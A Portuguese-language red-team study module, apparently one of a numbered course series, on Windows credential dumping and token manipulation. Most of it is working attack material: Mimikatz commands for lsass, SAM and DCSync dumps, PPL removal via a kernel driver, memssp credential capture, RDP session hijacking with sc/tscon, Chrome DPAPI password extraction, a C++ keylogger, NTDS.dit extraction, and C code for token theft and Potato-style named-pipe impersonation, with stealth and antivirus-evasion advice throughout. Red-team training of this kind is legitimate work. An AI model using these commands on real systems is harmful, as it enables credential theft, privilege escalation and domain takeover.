# SysKey : b03c5b92836f5412ee603c6a7f5d50db
# Local SID : S-1-5-21-4158778063-1250727167-3994265684
```

**Por que `token::elevate` é necessário para `lsadump::sam`:** O Mimikatz precisa de um token SYSTEM (não apenas de um processo rodando como admin com token filtrado) para abrir as chaves de registro SAM. O `token::elevate` encontra um token de impersonation de nível SYSTEM disponível em algum serviço local e o aplica ao thread do Mimikatz.

---

### Dump do lsass Sem Mimikatz no Host (OPSEC Alternativo)

O MalTrak apresenta esta abordagem como mais furtiva: em vez de levar o Mimikatz para a máquina comprometida (alto risco de detecção por assinatura), fazer o dump do processo e analisar offline.

#### Método 1: PowerShell (Out-Minidump)

```powershell
# Gerar dump de memória do lsass via PowerShell
Get-Process lsass | Out-Minidump

# Output: cria arquivo lsass_<PID>.dmp em C:\Windows\system32\
# Exemplo: lsass_644.dmp (55,445,582 bytes)
```

#### Método 2: procdump.exe (Sysinternals)

```cmd
# procdump é uma ferramenta legítima da Microsoft (menor risco de bloqueio por AV)
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

#### Análise do Dump Offline com Mimikatz

```
# Apontar Mimikatz para o arquivo de dump (pode ser feito em máquina do atacante)
sekurlsa::minidump lsass_644.dmp
sekurlsa::logonpasswords

# Output idêntico ao da extração direta, mas sem expor Mimikatz na máquina alvo
```

**Vantagem OPSEC:** O Mimikatz nunca toca a máquina comprometida. O dump pode ser exfiltrado e analisado localmente. O procdump é um binário assinado pela Microsoft, reduzindo alertas de AV.

---

### Bypass de Protected Process Light (PPL)

A Microsoft introduziu PPL para proteger o `lsass.exe` — processos não-PPL não conseguem abrir handles ao processo. O Mimikatz contorna isso via driver de kernel assinado:

#### Bypass via Driver do Mimikatz (mimidrv.sys)

```
# Carregar o driver de kernel do Mimikatz
privilege::driver
!+
# Output: 'mimidrv' service not present
#         'mimidrv' service successfully registered
#         'mimidrv' service ACL to everyone
#         'mimidrv' service started

# Remover a proteção PPL do lsass via kernel
!processprotect /process:lsass.exe /remove

# Agora extrair normalmente
sekurlsa::logonpasswords

# Descarregar o driver (limpeza)
!-
```

#### Bypass via Drivers Vulneráveis de Terceiros (BYOVD)

Ferramentas alternativas que exploram drivers legítimos mas vulneráveis para desabilitar PPL ou carregar drivers sem assinatura:

- **RTCore.sys** e **gdrv.sys**: drivers vulneráveis usados em ferramentas como PPLKiller e gdrv-loader
- **PPLKiller**: https://github.com/RedCursorSecurityConsulting/PPLKiller
- **gdrv-loader**: https://github.com/fengjixuchui/gdrv-loader

**OPSEC:** O carregamento de qualquer driver (mesmo assinado) gera Event 7045 no System log e é detectável por EDRs que monitoram drivers. O uso de drivers vulneráveis conhecidos também pode ser bloqueado por drivers de terceiros (HVCI).

---

### Bypass do Credential Guard via SSP Personalizado

O **Windows Credential Guard** move as credenciais para um processo isolado (`LsaIso.exe`) rodando em **Virtual Secure Mode (VSM)** — inacessível mesmo com acesso kernel ao Windows normal. O ataque ao Credential Guard não é ao storage protegido, mas à **interceptação antes do armazenamento**.

#### Como Funciona o Ataque via memssp

**Security Support Providers (SSPs)** são DLLs carregadas pelo lsass que recebem as credenciais em texto claro antes de processá-las. Um SSP malicioso pode capturar essas credenciais no momento da autenticação.

```
# Injetar SSP do Mimikatz na memória do lsass (sem arquivo em disco)
privilege::debug
misc::memssp
# Output: Injected =)

# Credenciais capturadas são salvas em:
# C:\Windows\system32\mimilsa.log

# Conteúdo do mimilsa.log após o usuário autenticar:
# [00000000:00c533b5] DESKTOP-1VUTB81\User    LabPass1
# [00000000:00c533d5] DESKTOP-1VUTB81\User    LabPass1
```

**Limitação:** O memssp é apenas in-memory — é perdido no reboot. Para capturar as credenciais, é necessário que o usuário autentique (ex: lock/unlock da workstation) após a injeção.

**Técnica para forçar a captura:**

```cmd
# Forçar bloqueio da estação de trabalho (usuário precisará digitar a senha para desbloquear)
rundll32.exe user32.dll,LockWorkStation
```

**Alternativa persistente (com mimilib.dll):** Registrar o SSP como um provedor permanente no registro (persiste reinicializações, mas deixa artefatos em disco):

```
# Via Mimikatz (requer reboot para ativar):
# Copia mimilib.dll para System32 e adiciona ao registro:
# HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
```

---

### Ferramentas Alternativas ao Mimikatz para Dump de Credenciais

O MalTrak menciona explicitamente ferramentas alternativas menos conhecidas para reduzir detecção por assinatura baseada em Mimikatz:

**MagnusKatz** — fork/alternativa modular ao Mimikatz:
- https://github.com/magnusstubman/MagnusKatz
- Pode ser incorporado como plugin direto em malware customizado
- Útil para bypass de assinaturas AV específicas de Mimikatz

**Referência técnica interna do Mimikatz:**
- https://improsec.com/tech-blog/mimikatz-under-the-hood

---

### Fluxo Completo de Token Impersonation via Windows API (MalTrak)

O MalTrak apresenta o fluxo de impersonation via API Windows como uma cadeia sequencial de chamadas, diretamente aplicável à escrita de malware customizado:

```
OpenProcess()
  ├── DWORD dwDesiredAccess
  ├── BOOL  bInheritHandle
  └── DWORD dwProcessId
         ↓ (retorna process handle)
OpenProcessToken()
  ├── HANDLE ProcessHandle
  ├── DWORD  DesiredAccess
  └── PHANDLE TokenHandle
         ↓ (retorna token handle)
         ├──────────────────────────────────────────┐
         ↓                                          ↓
ImpersonateLoggedOnUser()              DuplicateTokenEx()
  └── HANDLE hToken                      ├── HANDLE hExistingToken
  (impersonation direta                  ├── DWORD  dwDesiredAccess
   no thread atual)                      ├── LPSECURITY_ATTRIBUTES lpTokenAttributes
                                         ├── SECURITY_IMPERSONATION_LEVEL ImpersonationLevel
                                         ├── TOKEN_TYPE TokenType
                                         └── PHANDLE phNewToken
                                                ↓ (token duplicado)
                                         CreateProcessWithToken()
                                           ├── HANDLE hToken
                                           ├── DWORD  dwLogonFlags
                                           ├── LPCWSTR lpApplicationName
                                           ├── LPWSTR  lpCommandLine
                                           ├── DWORD   dwCreationFlags
                                           ├── LPVOID  lpEnvironment
                                           ├── LPCWSTR lpCurrentDirectory
                                           ├── LPSTARTUPINFOW lpStartupInfo
                                           └── LPPROCESS_INFORMATION lpProcessInformation
```

**Pré-requisito:** O código deve rodar sob contexto de administrador para que `OpenProcess()` e `OpenProcessToken()` tenham sucesso em processos de outros usuários.

#### Enumeração de Tokens Disponíveis (PowerShell)

```powershell
# Listar todos os tokens de impersonation disponíveis no sistema
Import-Module .\Get-Token.ps1
Get-Token |?{$_.ImpersonationLevel -ne "None"}

# Fonte: https://gist.github.com/vector-sec/a049bf12da619d9af8f9c7dbd28d3b56
```

---

### Tokens por Nível de Impersonation: Impacto Prático

O MalTrak clarifica a diferença operacional entre os níveis:

**Delegate-level tokens (nível mais alto):**
- Originam de sessões interativas remotas: RDP, logon de console
- Permitem movimento lateral — o token pode ser usado para autenticar em hosts remotos
- Exemplo: token do `explorer.exe` de uma sessão RDP de Domain Admin

**Impersonate-level tokens:**
- Originam de serviços e logons de rede (tipos 3 e 5)
- Úteis para escalada de privilégio **local** para SYSTEM
- Via Mimikatz: `token::elevate` encontra e aplica esses tokens
- Base dos ataques Potato (serviços como IIS e SQL têm `SeImpersonatePrivilege`)

**Regra crítica do MalTrak:** As credenciais estão vinculadas a **logon sessions**, não diretamente a tokens. Um token de impersonation de nível Impersonate de um serviço SYSTEM pode elevar privilégios localmente, mas não carrega credenciais de rede reutilizáveis.

---

### RDP Session Hijacking via Serviço (SYSTEM Required)

Quando operando como SYSTEM, é possível conectar a qualquer sessão RDP ativa no host sem necessidade de senha — mais furtivo que credential theft + pass-the-hash:

```cmd
# Passo 1: listar sessões ativas e seus IDs
query user
# OUTPUT:
#  USERNAME       SESSIONNAME    ID  STATE   IDLE TIME  LOGON TIME
#  administrator                  1  Disc         1     3/12/2017 3:07 PM
# >localadmin    rdp-tcp#55      2  Active         .   3/12/2017 3:10 PM

# Passo 2: criar serviço que conecta a sessão do admin (ID 1) à sessão atual (rdp-tcp#55)
sc create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
# Output: [SC] CreateService SUCCESS

# Passo 3: iniciar o serviço (roda como SYSTEM, sem necessidade de senha)
net start sesshijack

# Resultado: sua sessão é substituída pela sessão do administrator
```

**Por que funciona:** `tscon` é executado como SYSTEM (pelo serviço), e o contexto SYSTEM pode se conectar a qualquer sessão de terminal sem autenticação adicional.

**Referência:** https://github.com/crazywifi/RDP_SessionHijacking

---

### Roubo de Credenciais via CredUIPromptForWindowsCredentials (Engenharia Social Técnica)

O MalTrak apresenta uma abordagem de credential theft via API legítima do Windows — eficaz mesmo sem acesso a lsass:

```
API: CredUIPromptForWindowsCredentialsA (credui.dll)
```

**Como funciona:**
- Exibe uma caixa de diálogo Windows nativa e autêntica pedindo usuário/senha
- O visual é idêntico ao do sistema operacional (usa temas e fontes do Windows)
- Com a mensagem certa ("Outlook: login to email usuario@dominio.com"), convence usuários a digitar credenciais
- As credenciais são retornadas ao processo chamador em texto claro

**Vantagem:** Não requer acesso a lsass, SeDebugPrivilege ou qualquer dump — as credenciais chegam diretamente ao malware quando o usuário as digita.

**Referência técnica:** https://www.ired.team/offensive-security/credential-access-and-credential-dumping/credentials-collection-via-creduipromptforcredentials

---

### Roubo de Senhas Salvas no Navegador via DPAPI

Senhas de aplicações web corporativas (Okta, Helpdesk, Workday, etc.) frequentemente ficam salvas no navegador. Mimikatz pode descriptografar o banco de dados do Chrome usando DPAPI com o contexto do usuário atual:

```
# Extrair e descriptografar senhas salvas no Chrome
dpapi::chrome /in:"C:\Users\<Username>\AppData\Local\Google\Chrome\User Data\<Profile Name>\Login Data" /unprotect
```

**Por que funciona:** O Chrome usa DPAPI para criptografar as senhas, e o DPAPI usa como chave o hash de senha do usuário do Windows. Rodando como o usuário (ou com seu token), o Mimikatz consegue descriptografar diretamente.

---

### Keylogging via Windows API (GetAsyncKeyState)

O MalTrak apresenta keylogging como vetor de coleta de credenciais complementar — especialmente útil quando Credential Guard bloqueia dumps de lsass. Um keylogger básico em C++ usando a API nativa do Windows:

```cpp
// Loop principal de captura de teclas
while (true) {
    Sleep(10);
    for (int KEY = 8; KEY <= 190; KEY++) {
        if (GetAsyncKeyState(KEY) == -32767) {
            if (SpecialKeys(KEY) == false) {
                fstream LogFile;
                LogFile.open("dat.txt", fstream::app);
                if (LogFile.is_open()) {
                    LogFile << char(KEY);
                    LogFile.close();
                }
            }
        }
    }
}

// Tratamento de teclas especiais
bool SpecialKeys(int S_Key) {
    switch (S_Key) {
        case VK_SPACE:  LOG(" ");  return true;
        case VK_RETURN: LOG("\n"); return true;
        case VK_SHIFT:  LOG("#SHIFT#"); return true;
        // ...
    }
}
```

**Capacidades adicionais de keyloggers avançados:**
- Captura do título da janela ativa (identifica o app onde a senha foi digitada)
- Leitura de clipboard (captura passwords colados de gerenciadores de senha)
- Screenshot automatizado (contorna teclados virtuais)

**Referência de implementação:** https://github.com/EgeBalci/Keylogger/blob/master/Source.cpp

---

### Roubo de Credenciais do Domain Controller (NTDS.dit)

O ponto final da cadeia de escalada: ao comprometer o DC, todas as senhas do domínio ficam acessíveis via o banco de dados `NTDS.dit`:

```
Localização: C:\Windows\NTDS\NTDS.dit
```

**Métodos de extração:**
```
# Via Mimikatz (requer acesso ao DC):
lsadump::dcsync /domain:corp.local /all /csv

# Via Volume Shadow Copy (sem interromper o serviço AD):
vssadmin create shadow /for=C:
# Copiar NTDS.dit + SYSTEM hive do shadow copy
# Analisar offline com secretsdump.py (Impacket)

# Via Impacket remotamente (com credenciais de DA):
impacket-secretsdump -just-dc corp.local/administrator:Password@dc01
```

---

### Resumo de Técnicas por Cenário (Perspectiva MalTrak)

| Técnica | API/Ferramenta Principal | Pré-requisito | Persiste Reboot |
|---|---|---|---|
| Dump lsass direto | `sekurlsa::logonpasswords` | SeDebugPrivilege | N/A |
| Dump lsass offline | `Get-Process lsass \| Out-Minidump` + Mimikatz | Admin local | N/A |
| SAM dump local | `lsadump::sam` + `token::elevate` | SeDebugPrivilege + SYSTEM | N/A |
| Bypass PPL (driver) | `privilege::driver` + `!+` + `!processprotect` | Admin + driver signing | Nao |
| Bypass Credential Guard | `misc::memssp` | SeDebugPrivilege | Nao |
| SSP persistente | mimilib.dll no registro | Admin + reboot | Sim |
| Token impersonation | `OpenProcess` + `DuplicateTokenEx` + `ImpersonateLoggedOnUser` | Admin | N/A |
| RDP hijacking | `sc create` + `tscon` | SYSTEM | N/A |
| Chrome passwords | `dpapi::chrome` | Token do usuario | N/A |
| CredUI phishing | `CredUIPromptForWindowsCredentialsA` | Qualquer | N/A |
| Keylogging | `GetAsyncKeyState` | Qualquer | Depende |
| NTDS.dit dump | `lsadump::dcsync` ou VSS | Domain Admin | N/A |

---

## Token Internals — Kernel e WinDbg

### Estrutura _TOKEN — Campos Críticos

```
!process 0 1 lsass.exe     ; encontrar EPROCESS
dt nt!_EPROCESS <addr>     ; campo Token = EX_FAST_REF para _TOKEN
!token <token_addr>        ; dump completo do token
dt nt!_TOKEN <token_addr>  ; estrutura bruta
```

| Campo | Tipo | Valores Relevantes |
|-------|------|-------------------|
| `TokenSource` | TOKEN_SOURCE | "Advapi  " / "NTLM    " / "Kerberos" |
| `TokenId` | LUID | ID único do token no kernel |
| `AuthenticationId` | LUID | Logon session ID — compartilhado por todos tokens da sessão |
| `_SEP_TOKEN_PRIVILEGES` | struct | 3 bitmasks de 64-bit (Present/Enabled/Default) |
| `SessionId` | ULONG | Sessão Terminal Services (0 = sessão kernel/SYSTEM) |
| `TokenType` | enum | TokenPrimary(1) / TokenImpersonation(2) |
| `ImpersonationLevel` | enum | 0=Anonymous / 1=Identification / 2=Impersonation / 3=Delegation |
| `IntegrityLevelIndex` | — | Índice para SID de integridade em UserAndGroups |
| `MandatoryPolicy` | — | No-Write-Up / No-Read-Up / No-Execute-Up |

### _SEP_TOKEN_PRIVILEGES — Bitmasks de Privilégio

```
dt nt!_SEP_TOKEN_PRIVILEGES
   +0x000 Present  : Uint8B   ; privilégios que existem no token (immutável por AdjustTokenPrivileges)
   +0x008 Enabled  : Uint8B   ; privilégios atualmente ativos
   +0x010 Default  : Uint8B   ; ativos por padrão em novos threads
```

Bits relevantes para red team (via `whoami /priv`):
```
Bit 20 = SeDebugPrivilege         ; OpenProcess qualquer processo sem access check
Bit 17 = SeBackupPrivilege        ; ReadFile ignorando DACL (reg save SAM)
Bit 18 = SeRestorePrivilege       ; WriteFile ignorando DACL (DLL hijack)
Bit 23 = SeLoadDriverPrivilege    ; carregar driver kernel (BYOVD)
Bit 25 = SeTakeOwnershipPrivilege ; tomar posse de qualquer objeto
Bit 29 = SeImpersonatePrivilege   ; base dos Potato attacks
Bit  3 = SeAssignPrimaryTokenPrivilege ; CreateProcessAsUser com token arbitrário
Bit  2 = SeCreateTokenPrivilege   ; criar token com qualquer SID/privilege
```

`AdjustTokenPrivileges()` só altera o campo `Enabled` — não pode adicionar bits que não estão em `Present`. Para adicionar novos privilégios é necessário criar um novo token (requer `SeCreateTokenPrivilege`).

### AuthenticationId — Logon Session ID

O `AuthenticationId` é uma LUID que identifica a logon session. Todos os tokens de uma mesma sessão compartilham o mesmo valor:

```
0x000003e7  →  SYSTEM (LocalSystem)       ; sessão especial do kernel
0x000003e4  →  Network Service
0x000003e5  →  Local Service
0xnnnnn     →  sessão de usuário interativo (varia a cada logon)
```

Relevância para detecção: tokens com `AuthenticationId` diferente do processo parent indicam impersonation ou token theft em andamento. Ferramentas de EDR correlacionam `AuthenticationId` entre processos para detectar `steal_token`.

### Fluxo de Access Check — SeAccessCheck

```
Thread abre objeto (arquivo, processo, registry key...)
        │
ObpLookupObjectName()         ; resolve o nome do objeto no namespace
        │
ObpCreateHandle()             ; tenta criar o handle
        │
ObCheckObjectAccess()         ; invoca o SRM
        │
SeAccessCheck()
   ├─ Obtém token da thread (impersonation se ativo, primary caso contrário)
   ├─ Verifica MIC: nível de integridade do sujeito vs objeto (No-Write-Up)
   ├─ Verifica SecurityDescriptor do objeto:
   │   ├─ NULL DACL → acesso total concedido a todos
   │   ├─ Empty DACL → acesso negado a todos
   │   └─ DACL com ACEs → percorre em ordem:
   │       ├─ ACCESS_DENIED_ACE → nega imediatamente e para
   │       └─ ACCESS_ALLOWED_ACE → acumula direitos requisitados
   └─ Se todos direitos acumulados → ACCESS_GRANTED
      Caso contrário → ACCESS_DENIED
```

Com `SeDebugPrivilege` habilitado, `ObCheckObjectAccess` **bypassa a checagem** para `NtOpenProcess` — qualquer processo pode ser aberto com `PROCESS_ALL_ACCESS` independente do Security Descriptor.

### Verificar Token via API

```c
// Nível de integridade do processo atual
TOKEN_MANDATORY_LABEL til;
DWORD dwSize;
GetTokenInformation(hToken, TokenIntegrityLevel, &til, sizeof(til), &dwSize);
DWORD rid = *GetSidSubAuthority(til.Label.Sid, 0);
// 0x1000=Low, 0x2000=Medium, 0x3000=High, 0x4000=System
```

---

## Token Manipulation Avançada (MalDev)

### Campos Críticos do Token (Kernel Perspective)

Token é objeto kernel `TOKEN`. Campos principais visíveis via WinDbg:

```
dt nt!_TOKEN <addr>
   +0x000 TokenSource          : _TOKEN_SOURCE ("NtLmSsp", "NTLMSSP", etc.)
   +0x010 TokenId              : _LUID              ← ID único desse token
   +0x018 AuthenticationId     : _LUID              ← logon session compartilhada
   +0x020 TokenType            : _TOKEN_TYPE        ← Primary(1) vs Impersonation(2)
   +0x044 ImpersonationLevel   : _SECURITY_IMPERSONATION_LEVEL
   +0x048 TokenFlags           : flags bit mask      ← bit 0x20 = elevation
   +0x078 Privileges           : _SEP_TOKEN_PRIVILEGES
   +0x090 UserAndGroupCount    : int
   +0x098 SidHash              : _SID_AND_ATTRIBUTES_HASH
   +0x1f8 TokenId2             : _LUID
```

### SEP_TOKEN_PRIVILEGES Layout

```
dt nt!_SEP_TOKEN_PRIVILEGES <addr>
   +0x000 Present     : UINT64    ← bitmask de todos privileges presentes
   +0x008 Enabled     : UINT64    ← bitmask de privileges atualmente habilitados
   +0x010 EnabledByDefault : UINT64
```

Bit position = privilege LUID (ex: bit 20 = SeDebugPrivilege LUID 20). Para habilitar SeDebugPrivilege programaticamente:

```c
#include <windows.h>

BOOL EnablePrivilege(LPCWSTR szPriv) {
    HANDLE hToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    LookupPrivilegeValueW(NULL, szPriv, &tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return ok && GetLastError() == ERROR_SUCCESS;
}

// Uso:
EnablePrivilege(SE_DEBUG_NAME);  // SeDebugPrivilege → permite OpenProcess(LSASS)
```

### Token Stealing Avançado

#### 1. Impersonar Token de Outro Processo (sem duplicate)

```c
BOOL StealTokenFromProcess(DWORD dwPid) {
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPid);
    if (!hProc) return FALSE;

    HANDLE hToken = NULL;
    OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken);
    CloseHandle(hProc);

    HANDLE hImp = NULL;
    DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                     SecurityImpersonation, TokenImpersonation, &hImp);
    CloseHandle(hToken);

    // Impersonar na thread atual
    return ImpersonateLoggedOnUser(hImp);
}
```

Após `ImpersonateLoggedOnUser`, todas chamadas de API nessa thread usam contexto de segurança do token roubado.

#### 2. Criar Processo com Token Roubado

`CreateProcessWithTokenW` (secur32) → processo filho herda token roubado:

```c
BOOL SpawnAsToken(HANDLE hToken, LPWSTR szCmdLine) {
    HANDLE hPrimary = NULL;
    DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                     SecurityImpersonation, TokenPrimary, &hPrimary);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    BOOL ok = CreateProcessWithTokenW(hPrimary, 0, NULL, szCmdLine,
                                       0, NULL, NULL, &si, &pi);
    CloseHandle(hPrimary);
    return ok;
}
```

#### 3. Token Impersonation via Named Pipe

Clássico Potato: criar named pipe, coagir processo privilegiado a conectar, chamar `ImpersonateNamedPipeClient`.

```c
BOOL PotatoGetToken(HANDLE* phToken) {
    HANDLE hPipe = CreateNamedPipeA(
        "\\\\.\\pipe\\evil",
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1, 65536, 65536, 0, NULL);

    // Coagir SYSTEM a conectar (trigger via COM, SpoolSample, etc.)
    // [...]
    ConnectNamedPipe(hPipe, NULL);

    ImpersonateNamedPipeClient(hPipe);

    // Obter token da thread atual (agora SYSTEM)
    HANDLE hThread = GetCurrentThread();
    OpenThreadToken(hThread, TOKEN_DUPLICATE | TOKEN_QUERY, TRUE, phToken);

    RevertToSelf();
    CloseHandle(hPipe);
    return *phToken != NULL;
}
```

### Token Low-IL para Sandbox

Em vez de elevação, às vezes útil criar token com **Low Integrity Level** para isolar processo em sandbox:

```c
BOOL CreateLowIntegrityProcess(LPWSTR szCmdLine) {
    HANDLE hToken, hNewToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE, &hToken);
    DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                     SecurityImpersonation, TokenPrimary, &hNewToken);

    // Ajustar IntegrityLevel para Low (S-1-16-4096)
    TOKEN_MANDATORY_LABEL tml;
    SID_IDENTIFIER_AUTHORITY label = SECURITY_MANDATORY_LABEL_AUTHORITY;
    AllocateAndInitializeSid(&label, 1, SECURITY_MANDATORY_LOW_RID,
                              0,0,0,0,0,0,0, (PSID*)&tml.Label.Sid);
    tml.Label.Attributes = SE_GROUP_INTEGRITY;
    SetTokenInformation(hNewToken, TokenIntegrityLevel, &tml, sizeof(tml));

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessWithTokenW(hNewToken, 0, NULL, szCmdLine, 0, NULL, NULL, &si, &pi);
    return TRUE;
}
```

---

## Módulos Relacionados

`01_enumeracao_e_situational_awareness.md` alimenta `Get-NetLoggedon` e `Get-NetSession` pra identificar usuários com token disponível pra steal_token. `02_escalada_de_privilegio.md` cobre `SeImpersonatePrivilege` (habilita impersonation via Named Pipe nos Potato attacks) e SYSTEM pra steal_token irrestrito. `03_credenciais_windows.md` fornece hashes NTLM pra Pass-the-Hash via make_token e tickets Kerberos pra Pass-the-Ticket. `05_persistencia.md` consome token de Domain Admin pra Golden Ticket de longo prazo. MITRE ATT&CK: T1134, T1550.002, T1078.

---

## Leitura Complementar

- Windows Internals (Yosifovich et al.) — Security Reference Monitor + Token
- harmj0y — "Pass-the-Hash is Dead, Long Live LocalAccountTokenFilterPolicy"
- Cobalt Strike Documentation — Token Commands
- Rubeus — https://github.com/GhostPack/Rubeus
- Impacket — https://github.com/SecureAuthCorp/impacket
